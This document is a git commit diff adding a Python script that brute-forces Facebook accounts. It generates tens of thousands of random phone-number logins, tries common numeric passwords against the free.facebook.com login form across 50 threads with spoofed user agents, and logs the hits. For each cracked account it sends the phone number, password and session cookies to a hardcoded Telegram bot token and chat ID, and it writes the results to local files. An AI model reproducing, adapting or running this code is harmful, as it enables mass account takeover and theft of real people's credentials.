927e7f85fdf284635ad9b3714b447ac2a33faa0c
nademarwuf5 <138959925+nademarwuf5@users.noreply.github.com>
2023-10-06 09:56:26 +0300

    Update yy.py

--- yy.py
+++ yy.py
@@ -1,57 +1,251 @@
+print('\033[1;32m _ \033[1;31m  _  \033[1;32m _   \033[1;31m_  \033[1;32m _\n\033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \  \n \033[1;32mN | A | D | E | R \n\033[1;31m\_/ \033[1;32m\_/\033[1;31m \_/ \033[1;32m\_/ \033[1;31m\_/')
+print('')
+def heroes():
+    import time
+    import sys
+    anim = ["\x1b[1;97m[\x1b[1;91m■\x1b[0m□□□□□□□□□]  ","\x1b[1;97m[\x1b[1;92m■■\x1b[0m□□□□□□□□]  ","\x1b[1;97m[\x1b[1;93m■■■\x1b[0m□□□□□□□]  ","\x1b[1;97m[\x1b[1;95m■■■■\x1b[0m□□□□□□]  ","\x1b[1;97m[\x1b[1;94m■■■■■\x1b[0m□□□□□]  ","\x1b[1;97m[\x1b[38;5;26m■■■■■■\x1b[0m□□□□]  ","\x1b[1;97m[\x1b[1;96m■■■■■■■\x1b[0m□□□]  ","\x1b[1;97m[\x1b[38;5;86m■■■■■■■■\x1b[0m□]  ","\x1b[1;97m[\x1b[38;5;96m■■■■■■■■■\x1b[0m]  ","\x1b[1;97m[\x1b[38;5;203m■■■■■■■■■■\x1b[0m]  "]
+    
+    
+    for i in range(50):
+        time.sleep(.1)
+        sys.stdout.write('\r \033[1;32m NADER GOOD  '+anim[i % len(anim)])
+        
+        sys.stdout.flush()
+
+heroes()
+print('')
+try:
+    print('')
+    print('\033[1;32mOK : تم تشغيل الاداه ')
+    time.sleep(3)
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
+    if str(v) in update:
+        os.system('clear')
+    else:pass
+except:print('\n\033[1;32mRIT : سيتم بدا الصيد ')
+import datetime
 import webbrowser
 import requests,time,pyfiglet,datetime
-now = datetime.datetime.today()
+import os,sys,time,json,random,re,string,platform,base64,uuid
+os.system("git pull")
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.0011)
 
-now = datetime.datetime.today()
-mm = str(now.month)
-dd = str(now.day)
-yyyy = str(now.year)
-hour = str(now.hour)
-mi = str(now.minute)
-ss = str(now.second)
-t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
+M = '\x1b[1;97m' 
+P = '\x1b[1;91m' 
+K = '\x1b[1;92m' 
+H = '\x1b[1;93m' 
+U = '\x1b[1;94m' 
+B = '\x1b[1;95m' 
+N = '\x1b[1;96m' 
+O = '\x1b[0m'  
+BN = '\x1b[1;90m' 
+A = '\x1b[1;107m' 
+token=('6238470351:AAHKL1v7rxgZ5Au35fBJkFeD3XgKYvXzVsE')
+ID = ('1350971290')
+BBL = '\x1b[1;106m'  
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m'
+BA = '\x1b[1;100m' 
+logo = "\033[1;32m _ \033[1;31m  _  \033[1;32m _   \033[1;31m_  \033[1;32m _\n\033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \  \n \033[1;32mN | A | D | E | R \n\033[1;31m\_/ \033[1;32m\_/\033[1;31m \_/ \033[1;32m\_/ \033[1;31m\_/"
+print(logo)
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+loop = 0
+oks = []
+cps = []
+def clear():
+    os.system('clear')
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"   
+try:
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
+    if str(v) in update:
+        os.system('clear')
+    else:pass
+except:print('')
+#global functions
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
+ugen2=[]
+ugen=[]
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+def i():
+    user = []
+    twf = []
+    os.getuid
+    os.geteuid
+    os.system('clear')
+    code = '972'
+    os.system('clear')
+    limit = 50000
+    for nmbr in range(limit):
+        nmp = '55' + ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    os.system('clear')
+    print(logo)
+    passx = int('1')
+    HamiiID = []
+    print('')
+    pww = '١٢٣٤٥٦'
+    HamiiID.append(pww)
+    pww = '١٢٣٤٥٦٧٨٩'
+    HamiiID.append(pww)
+    with ThreadPool(max_workers=50) as manshera:
+        clear()
+        tl = str(len(user))
+        jalan('\033[1;32m _ \033[1;31m  _  \033[1;32m _   \033[1;31m_  \033[1;32m _\n\033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \  \n \033[1;32mN | A | D | E | R \n\033[1;31m\_/ \033[1;32m\_/\033[1;31m \_/ \033[1;32m\_/ \033[1;31m\_/')
+        print('')
+        jalan('\x1b[1;92m IDS: \x1b[0;95m' + tl)
+        print('')
+        jalan('\x1b[1;91m note: \x1b[0;92mوانت تنتظر صيدك صلي على نبييك ')
+        jalan('\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•\x1b[1;31m•\x1b[0;92m•\x1b[0;93m•')
+        for love in user:
+            pwx = [love[1:]]
+            uid = code+love
+            for Eman in HamiiID:
+                pwx.append(Eman)
+            manshera.submit(rcrack,uid,pwx,tl)
+def rcrack(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'free.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]                
+                n= (f'''
+❖ - CP : حساب مقفول يرجى الانتضار قليلا''')
+                from rich import print 
+                from rich.panel import Panel
+                ti = '[i][bold green] NADER[/bold green][/i]'
+                te = f'[green]{n} '
+                print(Panel(te,title=ti))
+                tlg = (f'''
+❖ - OK : ✅
 
+❖ - id : {cid}
+❖ - phone  : {uid}
+❖ - password : {ps}
 
-hours = (now.hour)
-x = datetime.datetime.now()
-g= datetime.datetime(2023, 1, 28, 12, 10 ,9)
+❖ - cookies : {coki}
 
-
-if (x.strftime("%x"))>(g.strftime("%x")):
- print('\033[1;32m تم ايقاف الاداه راسل المطور نادر لتفعيل ')
- time.sleep(1)
- print('\033[1;31m المطور نادر @N_2_N_1')
- time.sleep(1)
- print('\033[1;32m شروحات نادر')
- time.sleep(1)
- print('\033[1;31m 1')
- time.sleep(1)
- print('\033[1;32m 2')
- time.sleep(1)
- print('\033[1;31m 3')
- time.sleep(1)
- print('\033[1;32m 4')
- time.sleep(1)
- print('\033[1;31m 5')
- time.sleep(1)
- print('\033[1;32m 6')
- time.sleep(1)
- print('\033[1;31m 7')
- time.sleep(1)
- print('\033[1;32m 8')
- time.sleep(1)
- print('\033[1;31m 9')
- time.sleep(1)
- print('\033[1;32m10')
-# webbrowser.open('https://t.me/nader20090')
- exit()
- open(".token.txt", "w").write(' . . . .')
- print(x)
-name = input ('الاداه وقفت ما تحاول يمطي')
-if name ==  'NADER1jfjdjjfjfjfjjfjfjfj9' :
-	print('كسمك ليش رجعت الوقت هههه')
-else :
-   print('كسمك ليش رجعت الوقت هههه')
-   exit()
-   
-print('احبك')
+❖ - https://t.me/nader20090
+''')
+                requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))                
+                cek_apk(session,coki)
+                open('/sdcard/NADERok.txt', 'a').write('\n')
+                oks.append(cid)
+                follow(self, session, coki)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                
+                open('/sdcard/NADERCP.txt', 'a').write( cid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write('\r %s[%s/%s]  [OK NADER:%s]  [CP NADER:%s] \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.flush()
+    except:
+        pass       
+         
+i()
